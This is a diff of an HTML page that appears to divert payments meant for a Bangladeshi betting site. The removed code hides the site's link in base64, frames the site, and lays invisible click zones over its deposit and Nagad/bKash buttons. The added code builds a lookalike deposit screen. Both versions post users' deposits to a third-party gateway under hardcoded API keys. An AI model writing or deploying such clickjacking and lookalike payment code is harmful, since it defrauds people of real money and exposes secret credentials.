@@ -1,97 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Dk WIN</title>
-  
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=500;900&family=Rajdhani:wght=700&family=Fira+Code:wght=600&display=swap" rel="stylesheet">
-  
-  <style>
-    :root { --cyan: #00f3ff; --bg: #0b0e14; }
-    html, body { margin: 0; padding: 0; background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; overflow: hidden; height: 100dvh; width: 100vw; }
-    .view-screen { height: 100dvh; width: 100%; position: relative; background: #000; }
-    iframe { width: 100%; height: 100%; border: none; background: #fff; }
-    .overlay-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
-    .invisible-deposit-trigger { position: absolute; top: 36%; left: 33%; width: 18%; height: 55px; pointer-events: auto; cursor: pointer; z-index: 10000; }
-    .invisible-home-trigger { position: absolute; bottom: 0; left: 0; width: 20%; height: 60px; pointer-events: auto; cursor: pointer; z-index: 10000; display: none; }
-    .invisible-method-nagad { position: absolute; top: 33%; left: 3%; width: 22%; height: 75px; pointer-events: auto; cursor: pointer; z-index: 10001; display: none; }
-    .invisible-method-bkash { position: absolute; top: 33%; left: 27%; width: 22%; height: 75px; pointer-events: auto; cursor: pointer; z-index: 10001; display: none; }
-    .deposit-container { position: absolute; bottom: 12px; right: 12px; width: 120px; height: 40px; display: none; pointer-events: none; }
-    .deposit-btn { width: 100%; height: 100%; cursor: pointer; opacity: 0; pointer-events: auto; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Deposit Interface</title>
+    <style>
+        :root {
+            --primary-yellow: #fcd53f;
+            --bg-color: #f7f8fa;
+            --text-main: #333;
+        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg-color); margin: 0; padding: 15px; color: var(--text-main); }
+        .container { max-width: 450px; margin: auto; padding-bottom: 120px; }
+        .header { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; font-weight: 600; font-size: 16px; margin-bottom: 10px; }
+        .balance-card { background: var(--primary-yellow); padding: 25px 20px; border-radius: 12px; margin-bottom: 20px; }
+        .balance-card strong { font-size: 28px; display: block; margin-top: 5px; }
+
+        .method-tabs { display: flex; gap: 12px; margin-bottom: 20px; }
+        .tab { background: #fff; padding: 10px 5px; border-radius: 8px; flex: 1; text-align: center; border: 2px solid transparent; font-weight: 600; font-size: 12px; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
+        .tab.active { border-color: var(--primary-yellow); background: #fffdf0; }
+        .tab img { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; }
+
+        .channel-section { background: #fff; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .card { border: 1px solid #eee; padding: 12px; border-radius: 8px; font-size: 12px; cursor: pointer; }
+        .card.active { background: var(--primary-yellow); border-color: var(--primary-yellow); font-weight: 600; }
+
+        .amount-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; margin-bottom: 10px; }
+        .amt-btn { background: #fff; border: 1px solid #ddd; padding: 14px; text-align: center; border-radius: 6px; font-weight: 600; cursor: pointer; }
+        .amt-btn.active { border-color: var(--primary-yellow); background: #fffdf0; }
+        .custom-input { width: 100%; padding: 14px; margin-top: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+
+        .instructions { background: #fff; padding: 15px; border-radius: 12px; margin-top: 20px; font-size: 13px; line-height: 1.6; color: #666; }
+        .instructions ul { padding-left: 20px; margin: 0; }
+        .instructions li { margin-bottom: 8px; }
+
+        .footer { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #eee; box-sizing: border-box; }
+        
+        .btn-deposit { background: #d0d0d0; color: #fff; padding: 14px 40px; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn-deposit.active { background: var(--primary-yellow); color: #333; }
+    </style>
 </head>
 <body>
 
-  <div id="homeScreen" class="view-screen">
-    <div class="overlay-container">
-      <div class="invisible-deposit-trigger" id="depositTrigger" onclick="xCore.triggerDepositPage()"></div>
-      <div class="invisible-home-trigger" id="homeTrigger" onclick="xCore.triggerHomePage()"></div>
-      <div class="invisible-method-nagad" id="nagadTrigger" onclick="xCore.setMethod('nagad')"></div>
-      <div class="invisible-method-bkash" id="bkashTrigger" onclick="xCore.setMethod('bkash')"></div>
-      <div id="depositPanel" class="deposit-container">
-        <button id="mainDepositBtn" class="deposit-btn" onclick="xCore.action()"></button>
-      </div>
+<div class="container">
+    <div class="header"><span>&lt;</span> <strong>Deposit</strong> <span>Deposit history</span></div>
+    
+    <div class="balance-card">
+        <div>Balance</div>
+        <strong>৳0.00</strong>
     </div>
-    <iframe id="f-home" src="about:blank"></iframe> 
-  </div>
+
+    <div class="method-tabs">
+        <div class="tab active" onclick="updateMethod('Nagad', this)"> <img src="https://files.catbox.moe/ck93bf.jpg" alt="Nagad"> Nagad </div>
+        <div class="tab" onclick="updateMethod('bKash', this)"> <img src="https://files.catbox.moe/8x7zng.jpg" alt="bKash"> bKash </div>
+        <div class="tab" onclick="updateMethod('USDT', this)"> <img src="https://files.catbox.moe/6mtzt0.jpg" alt="USDT"> USDT </div>
+    </div>
+
+    <div class="channel-section">
+        <div style="font-weight: 600;">Select channel</div>
+        <div class="grid" id="channelGrid"></div>
+    </div>
+
+    <div style="font-weight: 600;">Deposit amount</div>
+    <div class="amount-grid">
+        <div class="amt-btn" onclick="selectAmount(this, 100)">100</div>
+        <div class="amt-btn" onclick="selectAmount(this, 200)">200</div>
+        <div class="amt-btn" onclick="selectAmount(this, 500)">500</div>
+        <div class="amt-btn" onclick="selectAmount(this, 5000)">5K</div>
+        <div class="amt-btn" onclick="selectAmount(this, 10000)">10K</div>
+        <div class="amt-btn" onclick="selectAmount(this, 50000)">50K</div>
+    </div>
+    <input type="number" id="amountInput" class="custom-input" placeholder="৳ 100.00 - 25,000.00" oninput="checkInput()">
+
+    <div class="instructions">
+        <strong>Recharge instructions</strong>
+        <ul>
+            <li>If the transfer time is up, please fill out the deposit form again.</li>
+            <li>The transfer amount must match the order you created.</li>
+            <li>If you transfer the wrong amount, we will not be responsible.</li>
+            <li>Note: do not cancel the order after money is transferred.</li>
+        </ul>
+    </div>
+</div>
+
+<div class="footer">
+    <div><small>Recharge Method:</small><br><strong id="methodName">GoPay-Nagad</strong></div>
+    <button class="btn-deposit" id="depositBtn" onclick="handleDeposit()">Deposit</button>
+</div>
 
 <script>
-  const xCore = {
-    selectedMethod: 'nagad',
-    apiKey: "54ca4fbc1238e668e149b249a5d5d07d04956cf79995b76ca150e8dbc1403fe0",
-    
-    init: function() {
-      // নতুন লিঙ্কটি এনকোড করা হয়েছে
-      document.getElementById('f-home').src = atob("aHR0cHM6Ly9ka3dpbjkuY29tLyMvcmVnaXN0ZXI/aW52aXRhdGlvbkNvZGU9Mzg3ODU4Mzg2Mw==");
-    },
+    const channels = {
+        'Nagad': ['GoPay-Nagad', 'OpPay-NAGAD', 'Lucky-Nagad', 'StarPago-NAGAD', 'CashPay-Nagad'],
+        'bKash': ['GoPay-bKash', 'OpPay-BKASH', 'Lucky-bKash', 'StarPago-BKASH', 'CashPay-bKash'],
+        'USDT': ['TRC20-USDT', 'ERC20-USDT', 'BEP20-USDT', 'SOL-USDT', 'MATIC-USDT']
+    };
 
-    triggerDepositPage: function() {
-      document.getElementById('depositPanel').style.display = 'block';
-      document.getElementById('depositTrigger').style.display = 'none';
-      document.getElementById('homeTrigger').style.display = 'block';
-      document.getElementById('nagadTrigger').style.display = 'block';
-      document.getElementById('bkashTrigger').style.display = 'block';
-    },
-
-    triggerHomePage: function() {
-      document.getElementById('depositPanel').style.display = 'none';
-      document.getElementById('homeTrigger').style.display = 'none';
-      document.getElementById('nagadTrigger').style.display = 'none';
-      document.getElementById('bkashTrigger').style.display = 'none';
-      document.getElementById('depositTrigger').style.display = 'block';
-    },
-
-    setMethod: function(method) { this.selectedMethod = method; },
-
-    action: function() {
-      const params = new URLSearchParams({
-        api_key: this.apiKey,
-        method: this.selectedMethod,
-        order_no: 'ORD_' + Date.now(),
-        amount: '100',
-        return_url: window.location.href,
-        pass_through_callback_url: 'https://your-site.com/callback.php'
-      });
-
-      fetch('https://api.nivopay.cyou/payment.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params
-      })
-      .then(res => res.json())
-      .then(data => {
-        if(data.status) {
-          window.location.href = data.payUrl;
-        } else {
-          alert("Error: " + data.message);
-        }
-      })
-      .catch(err => alert("Connection error, please check IP Whitelist."));
+    function updateMethod(method, el) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+        const grid = document.getElementById('channelGrid');
+        grid.innerHTML = '';
+        channels[method].forEach((name, index) => {
+            const div = document.createElement('div');
+            div.className = `card ${index === 0 ? 'active' : ''}`;
+            div.innerHTML = `${name}<br><small>Balance:100 - 25K</small>`;
+            div.onclick = function() {
+                document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                document.getElementById('methodName').innerText = name;
+            };
+            grid.appendChild(div);
+        });
+        document.getElementById('methodName').innerText = channels[method][0];
     }
-  };
 
-  window.onload = () => xCore.init();
+    function selectAmount(el, val) {
+        document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('amountInput').value = val;
+        document.getElementById('depositBtn').classList.add('active');
+    }
+
+    function checkInput() {
+        const val = document.getElementById('amountInput').value;
+        if(val >= 100) document.getElementById('depositBtn').classList.add('active');
+        else document.getElementById('depositBtn').classList.remove('active');
+    }
+
+    async function handleDeposit() {
+        const amount = document.getElementById('amountInput').value;
+        const method = document.getElementById('methodName').innerText.split('-')[1].toLowerCase();
+        const btn = document.getElementById('depositBtn');
+
+        if (amount < 100) { alert("Minimum amount is 100"); return; }
+        
+        btn.innerText = "Processing...";
+        
+        const params = new URLSearchParams({
+            'api_key': '03ee3a9c4ab6db3dc72aa1759d0bea3843804f9be8a39fd588abb97495622709',
+            'method': method,
+            'order_no': 'ORD-' + Date.now(),
+            'amount': amount,
+            'return_url': 'https://your-site.com/success.php',
+            'pass_through_callback_url': 'https://your-site.com/callback.php'
+        });
+
+        fetch('https://api.nivopay.cyou/payment.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: params
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status) {
+                window.location.href = data.payUrl;
+            } else {
+                alert(data.message || "Error occurred");
+                btn.innerText = "Deposit";
+            }
+        })
+        .catch(err => {
+            alert("Connection error!");
+            btn.innerText = "Deposit";
+        });
+    }
+
+    updateMethod('Nagad', document.querySelector('.tab'));
 </script>
 </body>
 </html>
